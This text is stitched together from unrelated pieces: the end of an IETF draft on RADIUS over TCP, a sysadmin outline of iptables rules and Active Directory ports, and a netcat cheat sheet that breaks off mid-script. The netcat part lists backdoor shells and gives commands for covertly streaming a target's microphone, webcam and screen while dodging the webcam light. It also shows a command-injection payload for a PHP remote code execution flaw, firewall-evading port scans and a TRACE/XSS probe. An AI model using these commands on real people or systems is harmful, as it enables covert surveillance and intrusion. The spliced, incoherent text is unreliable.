   An additional limit is the requirement to send a Status-Server packet



DeKok, Alan                   Experimental                     [Page 13]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   over the same TCP connection as is used for normal requests.  As
   noted in [RFC5997], the response to a Status-Server packet is either
   an Access-Accept or an Accounting-Response.  If all IDs were
   allocated to normal requests, then there would be no free ID to use
   for the Status-Server packet, and it could not be sent over the
   connection.

   Implementations SHOULD reserve ID zero (0) on each TCP connection for
   Status-Server packets.  This value was picked arbitrarily, as there
   is no reason to choose any one value over another for this use.

   Implementors may be tempted to extend RADIUS to permit more than 256
   outstanding packets on one connection.  However, doing so is a
   violation of a fundamental part of the protocol and MUST NOT be done.
   Making that extension here is outside of the scope of this
   specification.

| 2.6.6. EAP Sessions


   When RADIUS clients send EAP requests using RADIUS/TCP, they SHOULD
   choose the same TCP connection for all packets related to one EAP
   session.  This practice ensures that EAP packets are transmitted in
   order, and that problems with any one TCP connection do affect the
   minimum number of EAP sessions.

   A simple method that may work in many situations is to hash the
   contents of the Calling-Station-Id attribute, which normally contains
   the MAC address.  The output of that hash can be used to select a
   particular TCP connection.

   However, EAP packets for one EAP session can still be transported
   from client to server over multiple paths.  Therefore, when a server
   receives a RADIUS request containing an EAP request, it MUST be
   processed without considering the transport protocol.  For TCP
   transport, it MUST be processed without considering the source port.
   The algorithm suggested in [RFC5080] Section 2.1.1 SHOULD be used to
   track EAP sessions, as it is independent of source port and transport
   protocol.

   The retransmission requirements of Section 2.6.1, above, MUST be
   applied to RADIUS encapsulated EAP packets.  That is, EAP
   retransmissions MUST NOT result in retransmissions of RADIUS packets
   over a particular TCP connection.  EAP retransmissions MAY result in
   retransmission of RADIUS packets over a different TCP connection, but
   only when the previous TCP connection is marked DOWN.






DeKok, Alan                   Experimental                     [Page 14]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


| 2.6.7. TCP Applications are not UDP Applications


   Implementors should be aware that programming a robust TCP
   application can be very different from programming a robust UDP
   application.  It is RECOMMENDED that implementors of this
   specification familiarize themselves with TCP application programming
   concepts.

   Clients and servers SHOULD implement configurable connection limits.
   Clients and servers SHOULD implement configurable rate limiting on
   new connections.  Allowing an unbounded number or rate of TCP
   connections may result in resource exhaustion.

   Further discussion of implementation issues is outside of the scope
   of this document.

| 3. Diameter Considerations


   This document defines TCP as a transport layer for RADIUS.  It
   defines no new RADIUS attributes or codes.  The only interaction with
   Diameter is in a RADIUS to Diameter, or in a Diameter to RADIUS
   gateway.  The RADIUS side of such a gateway MAY implement RADIUS/TCP,
   but this change has no effect on Diameter.

| 4. IANA Considerations


   This document requires no action by IANA.

| 5. Security Considerations


   As the RADIUS packet format, signing, and client verification are
   unchanged from prior specifications, all of the security issues
   outlined in previous specifications for RADIUS/UDP are also
   applicable here.

   As noted above, clients and servers SHOULD support configurable
   connection limits.  Allowing an unlimited number of connections may
   result in resource exhaustion.

   Implementors should consult [RADIUS/TLS] for issues related the
   security of RADIUS/TLS, and [RFC5246] for issues related to the
   security of the TLS protocol.

   Since "bare" TCP does not provide for confidentiality or enable
   negotiation of credible ciphersuites, its use is not appropriate for
   inter-server communications where strong security is required.  As a
   result "bare" TCP transport MUST NOT be used without TLS, IPsec, or
   other secure upper layer.



DeKok, Alan                   Experimental                     [Page 15]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   There are no (at this time) other known security issues for RADIUS
   over TCP transport.

| 6. References


| 6.1. Normative References


[RFC2119] Bradner, S., "Key words for use in RFCs to Indicate
          Requirement Levels", BCP 14, RFC 2119, March 1997.

[RFC2865] Rigney, C., Willens, S., Rubens, A., and W. Simpson, "Remote
          Authentication Dial In User Service (RADIUS)", RFC 2865, June
          2000.

[RFC3539] Aboba, B. et al., "Authentication, Authorization and
          Accounting (AAA) Transport Profile", RFC 3539, June 2003.

[RADIUS/TLS]
          Winter, S. et. al., "TLS encryption for RADIUS over TCP
          (RadSec)", draft-ietf-radext-radsec-07.txt, July 2010 (work in
          progress).

[RFC5997] DeKok, A., "Use of Status-Server Packets in the Remote
          Authentication Dial In User Service (RADIUS) Protocol", RFC
          5997, August, 2010.

| 6.2. Informative References


[RFC2866] Rigney, C., "RADIUS Accounting", RFC 2866, June 2000.

[RFC3579] Aboba, B. and P. Calhoun, "RADIUS (Remote Authentication Dial
          In User Service) Support For Extensible Authentication
          Protocol (EAP)", RFC 3579, September 2003.

[RFC4301] Kent, S. and R. Atkinson, "Security Architecture for the
          Internet Protocol", RFC 4301, December, 2005.

[RFC4668] Nelson, D, "RADIUS Authentication Client MIB for IPv6", RFC
          4668, August 2006.

[RFC4669] Nelson, D, "RADIUS Authentication Server MIB for IPv6", RFC
          4669, August 2006.

[RFC4670] Nelson, D, "RADIUS Accounting Client MIB for IPv6", RFC 4670,
          August 2006.

[RFC4671] Nelson, D, "RADIUS Accounting Server MIB for IPv6", RFC 4671,
          August 2006.



DeKok, Alan                   Experimental                     [Page 16]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


[RFC4672] Nelson, D, "RADIUS Dynamic Authorization Client MIB", RFC
          4672, August 2006.

[RFC4673] Nelson, D, "RADIUS Dynamic Authorization Server MIB", RFC
          4673, August 2006.

[RFC5080] Nelson, D. and DeKok, A, "Common Remote Authentication Dial In
          User Service (RADIUS) Implementation Issues and Suggested
          Fixes", RFC 5080, December 2007.

[RFC5176] Chiba, M. et al., "Dynamic Authorization Extensions to Remote
          Authentication Dial In User Service (RADIUS)", RFC 5176,
          January 2008.

[RFC5216] Simon, D., etc al., "The EAP-TLS Authentication Protocol", RFC
          5216, March 2008.

[RFC5246] Dierks, T., Rescorla, E., "The Transport Layer Security (TLS)
          Protocol Version 1.2", RFC 5246, August 2008.

Acknowledgments

   None at this time.

Authors' Addresses

   Alan DeKok
   The FreeRADIUS Server Project
   http://freeradius.org/

   Email: aland@freeradius.org




















DeKok, Alan                   Experimental                     [Page 17]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


Open issues

   Open issues relating to this document are tracked on the following
   web site:

   http://www.drizzle.com/~aboba/RADEXT/













































DeKok, Alan                   Experimental                     [Page 18]


Html markup produced by rfcmarkup 1.101, available from http://tools.ietf.org/tools/rfcmarkup/ 

				8.3.1.2.2

			8.3.1.3

		8.3.2

	8.4
9. Useful tools

	9.1 netstat

	9.2 iptables

		9.2.1  My examples

			9.2.1.1  Block IP
block source: iptables -A INPUT -s <IP address> -j DROP
block dest: iptables -A OUTPUT -d <IP address> -j DROP

- Unblock
iptables -L INPUT -n --line-numbers
iptables -D INPUT N
where N is line # blocking the IP 

			9.2.1.2 Allow access to DNS nameserver
Linux Iptables block or open DNS / bind service port 53
by NIX CRAFT on JULY 13, 2005 · 4 COMMENTS· LAST UPDATED OCTOBER 12, 2007
in BIND DNS, DEBIAN LINUX, GENTOO LINUX

The domain name service provided by BIND (named) software. It uses both UDP and TCP protocol and listen on port 53. DNS queries less than 512 bytes are transferred using UDP protocol and large queries are handled by TCP protocol such as zone transfer.

i) named/bind server – TCP/UDP port 53

ii)Client (browser, dig etc) – port > 1023

Allow outgoing DNS client request:

Following iptables rules can be added to your shell script.

SERVER_IP is your server ip address

DNS_SERVER stores the nameserver (DNS) IP address provided by ISP or your own name servers.

Following rules are useful when you run single web/smtp server or even DSL/LL/dialup Internet connections:

SERVER_IP="202.54.10.20"
DNS_SERVER="202.54.1.5 202.54.1.6"
for ip in $DNS_SERVER
do
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 1024:65535 -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p udp -s $ip --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT-p tcp -s $SERVER_IP --sport 1024:65535 -d $ip --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp -s $ip --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
done
(B) Allow incoming DNS request at port 53:

Use following rules only if you are protecting dedicated DNS server.

SERVER_IP is IP address where BIND(named) is listing on port 53 for incoming DNS queries.

Please note that here I'm not allowing TCP protocol as I don't have secondary DNS server to do zone transfer.

SERVER_IP="202.54.10.20"
iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT
iptables -A INPUT -p udp -s 0/0 --sport 53 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p udp -s $SERVER_IP --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j ACCEPT
Please note if you have secondary server, add following rules to above rules so that secondary server can do zone transfer from primary DNS server:

DNS2_IP="202.54.10.2"
iptables -A INPUT -p tcp -s $DNS2_IP --sport 1024:65535 -d $SERVER_IP --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -s $SERVER_IP --sport 53 -d $DNS2_IP --dport 1024:65535 -m state --state ESTABLISHED -j ACCEPT

			9.2.1.3 Block access to DNS nameserver
[root@horse4 ~]# export SERVER_IP="10.56.53.28"
[root@horse4 ~]# export DNS_SERVER="10.56.53.79"
[root@horse4 ~]# iptables -A OUTPUT -p udp -s $SERVER_IP --sport 1024:65535 -d $DNS_SERVER  --dport 53 -m state --state NEW,ESTABLISHED -j DROP
[root@horse4 ~]# iptables -A INPUT -p udp -s $DNS_SERVER --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j DROP
Try `iptables -h' or 'iptables --help' for more information.
[root@horse4 ~]# iptables -A OUTPUT -p tcp -s $SERVER_IP --sport 1024:65535 -d $DNS_SERVER --dport 53 -m state --state NEW,ESTABLISHED -j DROP
[root@horse4 ~]# iptables -A INPUT -p tcp -s  $DNS_SERVER --sport 53 -d $SERVER_IP --dport 1024:65535 -m state --state ESTABLISHED -j DROP
[root@horse4 ~]# nslookup horse2
;; connection timed out; trying next origin
;; connection timed out; no servers could be reached

			9.2.1.4 UnBlock access to DNS nameserver
cont. prev ex:
[root@horse4 ~]# iptables -L OUTPUT -n
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
DROP       all  --  10.56.53.79          0.0.0.0/0           
DROP       udp  --  10.56.53.28          10.56.53.79         udp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
DROP       tcp  --  10.56.53.28          10.56.53.79         tcp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
[root@horse4 ~]# iptables -L OUTPUT -n --line-numbers
Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
3    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
4    DROP       all  --  10.56.53.79          0.0.0.0/0           
5    DROP       udp  --  10.56.53.28          10.56.53.79         udp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
6    DROP       tcp  --  10.56.53.28          10.56.53.79         tcp spts:1024:65535 dpt:53 state NEW,ESTABLISHED 
[root@horse4 ~]#   -n --line-numbers
-bash: -n: command not found
[root@horse4 ~]# iptables -D OUTPUT 5
[root@horse4 ~]# iptables -D OUTPUT 5
[root@horse4 ~]# iptables -L OUTPUT -n --line-numbers
Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       icmp --  0.0.0.0/0            0.0.0.0/0           icmp type 14 
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           
3    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           
4    DROP       all  --  10.56.53.79          0.0.0.0/0   

[root@horse4 ~]# iptables -L INPUT -n --line-numbers
Chain INPUT (policy DROP)
num  target     prot opt source               destination         
1    RATELIMIT  all  --  0.0.0.0/0            0.0.0.0/0           
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED 
3    DROP       all  --  10.56.53.79          0.0.0.0/0           
4    DROP       udp  --  10.56.53.79          10.56.53.28         udp spt:53 dpts:1024:65535 state ESTABLISHED 
5    DROP       tcp  --  10.56.53.79          10.56.53.28         tcp spt:53 dpts:1024:65535 state ESTABLISHED 
[root@horse4 ~]# iptables -D INPUT 4
[root@horse4 ~]# iptables -D INPUT 4
[root@horse4 ~]# iptables -L INPUT -n --line-numbers
Chain INPUT (policy DROP)
num  target     prot opt source               destination         
1    RATELIMIT  all  --  0.0.0.0/0            0.0.0.0/0           
2    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED 
3    DROP       all  --  10.56.53.79          0.0.0.0/0       

			9.2.1.5 Required ports to communicate with Active-Directory Domain controller
UDP Port 88 for Kerberos authentication

UDP and TCP Port 135 for domain controllers-to-domain controller and client to domain controller operations.

TCP Port 139 and UDP 138 for File Replication Service between domain controllers.

UDP Port 389 for LDAP to handle normal queries from client computers to the domain controllers.

TCP and UDP Port 445 for File Replication Service

TCP and UDP Port 464 for Kerberos Password Change

TCP Port 3268 and 3269 for Global Catalog from client to domain controller.

TCP and UDP Port 53 for DNS from client to domain controller and domain controller to domain controller.

also, take a look at the below article.. http://support.microsoft.com/kb/832017#4 

RPC (445) TCP
LDAP (389) TCP
LDAP (389) UDP
KDC (88) TCP
UDP/TCP (3268) - GC
KPASS (464) TCP
NTP? (123) UDP
 DCERPC - ports 135,445 is down

			9.2.1.6
		9.2.2 25 most used iptables examples
# Modify this file accordingly for your specific requirement.
# http://www.thegeekstuff.com
# 1. Delete all existing rules
iptables -F

# 2. Set default chain policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# 3. Block a specific ip-address
#BLOCK_THIS_IP="x.x.x.x"
#iptables -A INPUT -s "$BLOCK_THIS_IP" -j DROP

# 4. Allow ALL incoming SSH
#iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 5. Allow incoming SSH only from a sepcific network
#iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 6. Allow incoming HTTP
#iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT

# Allow incoming HTTPS
#iptables -A INPUT -i eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A OUTPUT -o eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT

# 7. MultiPorts (Allow incoming SSH, HTTP, and HTTPS)
iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT

# 8. Allow outgoing SSH
iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 9. Allow outgoing SSH only to a specific network
#iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
#iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

# 10. Allow outgoing HTTPS
iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT

# 11. Load balance incoming HTTPS traffic
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443
#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443

# 12. Ping from inside to outside
iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT

# 13. Ping from outside to inside
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT

# 14. Allow loopback access
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 15. Allow packets from internal network to reach external network.
# if eth1 is connected to external network (internet)
# if eth0 is connected to internal network (192.168.1.x)
iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT

# 16. Allow outbound DNS
#iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT
#iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT

# 17. Allow NIS Connections
# rpcinfo -p | grep ypbind ; This port is 853 and 850
#iptables -A INPUT -p tcp --dport 111 -j ACCEPT
#iptables -A INPUT -p udp --dport 111 -j ACCEPT
#iptables -A INPUT -p tcp --dport 853 -j ACCEPT
#iptables -A INPUT -p udp --dport 853 -j ACCEPT
#iptables -A INPUT -p tcp --dport 850 -j ACCEPT
#iptables -A INPUT -p udp --dport 850 -j ACCEPT

# 18. Allow rsync from a specific network
iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT

# 19. Allow MySQL connection only from a specific network
iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT

# 20. Allow Sendmail or Postfix
iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT

# 21. Allow IMAP and IMAPS
iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT

# 22. Allow POP3 and POP3S
iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT

# 23. Prevent DoS attack
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# 24. Port forwarding 422 to 22
iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22
iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT

# 25. Log dropped packets
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix "IPTables Packet Dropped: " --log-level 7
iptables -A LOGGING -j DROP

	9.3 telnet


	9.4 netcat, nc

		9.4.1 Netcat cheat sheet

    Netcat, also known as the Swiss-army knife for TCP/IP is capable of so many wonderful tasks, many people only know a partial amount of the features so I made a special cheat sheet for all the basic and more advanced features it supports.

Backdooring

    Basic netcat backdoor shells
    Better netcat backdoor shells

Contents 	Introduction
listening/connecting

    Make netcat listen for a connection
    Make netcat connect

Using files during connections
Port scanning

    Portscan a target with netcat
    Portscan a network range with netcat

Banner grabbing
Introduction

The basics of Netcat can be found in the man page which is good for beginners, you can find the man page for your version of netcat by typing this in the terminal:

$ man nc

If you don't like reading man pages through the terminal you can install the package "man2html" which makes it possible to read the manuals through the browser or just Google the man page with the query "man <program>" ("man nc" in our case).
Make netcat listen for a connection

Command

nc -l <port>

Result
Netcat will start to listen on the defined <port>, as soon as something makes a full 3-way TCP handshake to the port there is the possibility of transferring data, the connection can be closed at any time from both sides; once the connection is closed the netcat process is also stopped and the port will be closed again.

Example

nc -l 1337

Notes
1. You may need the -p parameter to define the port; in most versions this is not required (nc -l -p 1337).
2. If you want to force netcat to stay listening after one connection you can use the -k flag. (nc -l -k 1337)
3. Using the -v (verbose) flag will make netcat output who is connecting (over stderr), this is good to know when using the -k flag because it is possible that there are different computers connecting to you.
4. Flags can be parsed in a chain like this: "nc -lkv 1337".
Make netcat connect

Command

nc <computer> <port>

Result
Netcat will establish a 3-way TCP handshake to the defined computer/port, when succeeded you can talk with the computer/port with the keyboard (stdin).

Example

nc h.ackack.net 80

Notes
1. Adding the "-v" (verbose) flag is a nice check to see if a website is up. Here is an example:

$ nc -v www.ackack.net 80
Connection to www.ackack.net 80 port [tcp/www] succeeded!

Using files during connections

It is possible to save the data which is send to you or you can give netcat a file which should be sended when a connection is made.
Here is an example on how to save the data which is being send by the server:

$ nc h.ackack.net 80 > response
# you can now send data but you won't see the output from the server because it is being redirected to a file.
$ nc ackack.net 80 > response
HEAD / HTTP/0.1

$ cat response
HTTP/1.1 200 OK
Date: <timestamp>
Server: Apache
Last-Modified: <timestamp>
Accept-Ranges: bytes
Content-Length: 3383
Connection: close
Content-Type: text/html

It is also possible to give netcat a file which should be pushed over the connection as soon as netcat connects, here is an example where we make the local computer listen over port 1337 and netcat will connect to it and push a file through the connection.

# First we need a file so let's create one already.
$ echo "Hello world" > file
# In another terminal we make netcat listen on port 1337 and wait for the file.
$ nc -l 1337
# Now we are going to connect to the port and push the file through the connection.
$ nc localhost 1337 < file
# Look on in the terminal where you just made netcat listen, here is the output:
$ nc -l 1337
Hello world
# You may have noticed that the connection was terminated, this is normal when you push a file through the connection netcat will terminate it when the eof is reached.

Alright, now let's try to do some cool things with this.
We can transfer files this way by making netcat listen on the first side of the connection and capture it on the other side.

# First make it listen and tell it to capture the output to a file.
$ nc -l 1337 > backup.tar.gz
# Now connect to it and push a file in it
$ nc localhost 1337 < backup.tar.gz
# Now you got a file which is called "backup.tar.gz" and contains the same content on both sides.

Or reversed...

# Now make the server listen and anything that connects to it will get the file backup.tar.gz
$ nc -l 1337 < backup.tar.gz
# On the other side connect and save the contents
$ nc localhost 1337 > backup.tar.gz
# Same result: a copy of backup.tar.gz is made.

You can also monitor files this way:

# Make netcat listen, this time we do it with a pipe symbol, this is just another way to get the job done.
$ tail -f /var/log/apache2/access.log | nc -l 1337
# Connect to it
$ nc localhost 1337
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<ip> - - [<timestamp>] <user agent>
<streaming output of /var/log/apache2/access.log>
# The connection will stay open and if there are any new requests you will immediately receive them.

Here is another very cool example, here we are going live eavesdrop the microphone of the target:

# We are going to use arecord for this and all output will be written to whatever is connected to port 1337.
arecord -f dat -t raw | nc -l 1337
# Now we have to connect to this port with netcat and we want to convert all data which is being send to .ogg format so we can hear it.
nc localhost 1337 | oggenc - -r -o nc.ogg
# Now just open nc.ogg with ogg123/vlc or something you like and you will have a live stream with your target's microphone. It will also save all the data to nc.ogg which is good for when you later want to analyze what people said.

The same method can be used for eavesdropping the screen/webcam/anything you like, just find a nice package which can do the job for you.

For desktop and sound eavesdropping the package "recordmydesktop" is good when it's installed.
Getting a good streaming connection with screen and sound is pretty hard so what I did to get it to work is just make a dumpfile like this:
recordmydesktop --on-the-fly-encoding --overwrite -o /tmp/nc.ogv
And later transfer the entire contents to me the way we earlier transferred files.
nc -l 1337 < /tmp/nc.ogv
Then you can just view the video and recorded sound.
Be sure you don't let the entire hard disk overflow with this because it will stay recording, a simple command can kill the recordmydesktop process again.
$ killall recordmydesktop
Or just find the pid with the program ps and kill the pid.

Eavesdropping the webcam with nc is very detectable due to the blinking light/steady green light on the webcam these days, what you can do is just making pictures which will only make it blink very fast, I you can use various packets for it but I will demonstrate it here with streamer.

# First you make a photo and save it in /tmp/image.jpeg, then you set netcat to listen and let it present the photo once somebody connects to it.
$ while [ 1 ]; do streamer -o /tmp/photo.jpeg; nc -l 1337 < /tmp/photo.jpeg; done
# On the other side you connect to it and save the current image.
$ nc localhost 1337 > image.jpeg
# Now the picture will get updated and when reconnecting you will get a new picture real time.

The same idea can be implemented for screenshots.

# listen
$ while true; do import -window root /tmp/image.png; nc -l 1337 < /tmp/image.png; done
# and connect
$ nc localhost 1337 > image.png
# Screenshot is updated and you can grab a new screenshot.

Portscan a target with netcat

Command

nc -zv <target> <port/port range> 2>&1 | grep succeeded

Result
Netcat will start trying to make full 3-way TCP handshakes over the port/port range.
-> SYN
-> ACK
nmap does it a little bit different and injects a RST packet instead of an ACK, this causes the connection to not fully get established and is way more stealthy.
-> SYN
-> RST
"2>&1" is because we want to redirect stderr (standard error) and stdout (standard output) both to a file, I will be using this a lot in the following port scan examples so remember this.

Example

nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded

Notes
1. When using something like a PHP RCE exploit and you don't have a streaming connection through a shell it is useful to pipe the output to a file. Here is an example of how to do so:

nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt
#Inject it where you got a remote code execution exploit, here is an example:
#http://att.ackack.net/imageviewer.php?ls=/var/www/images/'; nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt; echo '
#This will happen server side in this example: $ ls '/var/www/images/'; nc -zv 10.13.37.1 1-3400 2>&1 | grep succeeded > /tmp/10.13.37.1.txt; echo '';

Portscan a network range with netcat

method 1, subnet scanning

# We will be scanning the subnet 10.13.37.1/24 for port 80, results can be found back in /tmp/pscan and it is all multi tasked so this shouldn't take longer than a second or 2.
$ range="10.13.37."; port=80; for host in $(seq 1 255); do multi_task=$(result=$(nc -zv $range$host $port 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $range$host":"$port >> "/tmp/pscan"; fi;) & done

method 2, list based scanning

# You will need a file filled with hosts for this, I used /tmp/hosts which contained:
# 10.13.37.1
# 10.13.37.23
# google.com
# 10.13.37.173
# ackack.net
$ port=80; for host in $(cat /tmp/hosts); do multi_task=$(result=$(nc -zv $host $port 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $host":"$port >> "/tmp/pscan"; fi;) & done
# It's all multi tasked again and the structure is pretty similar to the method 1.

method 3, network subnet scanning all ports on all hosts
Extremely noisy to firewalls and might eat a lot of CPU but it works, you can also save it to a file and issue it with the command "nice -n 20" this makes it a little nicer for your CPU.

$ range="10.13.37."; for host in $(seq 1 255); do multi_task=$(result=$(nc -zv $range$host 1-65535 2>&1 | grep succeeded); if [ -n "$result" ]; then echo $result >> "/tmp/pscan"; fi;) & done

method 4 list based scanning with delay

Some delay between the ports is good for letting the firewalls think there is nothing special going on.
This will scan all the hosts in /tmp/hosts on ports 20-100 with 1 second delay between the ports and save the results to /tmp/pscan.

#!/bin/sh
range="10.13.37."
ports=$(seq 20 100)
for host in $(cat /tmp/hosts); do
	for port in $ports; do
		result=$(nc -zv $range$host $port 2>&1 | grep succeeded);
		if [ -n "$result" ]; then
			echo $range$host":"$port >> "/tmp/pscan";
		fi;
		sleep 1;
	done
done

Notes
1. If you don't want multi tasked scanning which can be pretty extensive and noisy replace the "& done" for "; done".
2. Adding the -r flag will make the source and or destination port ranges random instead of letting the system assign which ports to use.
Banner grabbing

Port scanning is fun but we can't do a lot with this until we properly fingerprinted the programs behind the ports, this can be done with a technique called banner grabbing.
Now that the scripts are getting bigger and bigger I won't be displaying one liners anymore, you will have to write the files to filenames and execute them.
Here is a script which will port scan and banner grab automatically with netcat.
It will check for the SSH and MySQL version by connecting and saving the results and it will see if the HTTP server is vulnerable to the TRACE method, look in the dumpfile /tmp/bannergrab and look for "<script>alert(123)</script>" if you can find that back you got yourself a vulnerable server.

#!/bin/sh
range="192.168.1.";
# You can change this to a port range $(seq 20 25) is port 20-25
ports="22 80 3306";

http_header="HEAD / HTTP/0.1\n\n";

for host in $(seq 137 139); do
	for port in $ports; do
		echo "[+] Testing "$range$host":"$port;
		result=$(nc -zv $range$host $port 2>&1 | grep succeeded);
		if [ -n "$result" ]; then
			echo "\n"$range$host":"$port"\n" >> "/tmp/bannergrab"
			if [ "$port" -eq "22" ]; then
				echo "Found open port "$range$host":"$port" Here might be some SSH server, it echoes the SSH version to you on connecting when lucky.";
				nc -v $range$host $port -w 1 >> "/tmp/bannergrab";
			fi;
			if [ "$port" -eq "80" ]; then
				echo "Found open port "$range$host":"$port" Trying to fingerprint with HEAD and see if the server is vulnerable to TRACE XSSing";
				echo $http_header | nc -v -w 2 $range$host $port >> "/tmp/bannergrab"
